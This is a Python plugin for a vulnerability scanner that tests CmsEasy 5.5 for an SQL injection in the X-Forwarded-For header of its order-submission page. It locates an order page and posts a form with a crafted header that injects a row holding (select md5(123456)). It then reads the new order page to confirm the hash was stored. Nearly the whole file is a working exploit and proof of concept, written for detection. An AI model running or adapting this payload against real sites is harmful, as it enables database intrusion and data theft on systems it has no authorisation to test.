#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'Medici.Yan'
import re
'''
	订单提交页面 http 头部注入http://www.2cto.com/Article/201312/264398.html
	影响版本：CmsEasy_5.5_UTF-8_20130605
	/lib/tool/front_class.php文件中。在该文件中的第505行

'''
def assign(service, arg):
	if service == "cmseasy":
		return True, arg

def audit(arg):
	orderurl=arg+'index.php?case=archive&act=orders&aid='
	for i in range(10,500,10):
		url=orderurl+str(i)
		code,head,body,errcode,redirect_url=curl.curl(url)
		if code==200 and '在线支付' in body:
			goInjection(arg,url)
			break

def goInjection(arg,url):
	send_data='pnums=1&pname=2221&telphone=2321&address=121211&postcode=1323212&content=1232312&submit=+%E6%8F%90%E4%BA%A4+'
	payload="X-Forwarded-For: 127.0.0.1','1','1'),('1','a','a',(select md5(123456)),'a','a','0','1381393437','127.0.0.1"
	code,head,body,errcode,redirect_url=curl.curl('-H "%s" -d "%s" %s'%(payload,send_data,url))
	if code==200 and '提交订单成功' in body:
		res=re.findall(r'case=archive&act=orders&oid=(.*?)"', body)
		page=arg+'index.php?case=archive&act=orders&oid='+str(res[0])
		code1,head1,body1,errcode1,redirect_url1=curl.curl(page)
		if code1==200 and 'e10adc3949ba59abbe56e057f20f883e' in body1:
			security_hole('Cmseasy HTTP head(x-forward-for) Sql Injection:'+url)

if __name__ == '__main__':
	from dummy import *
	audit(assign('cmseasy', 'http://localhost/cmseasy5_5_20130605/')[1])
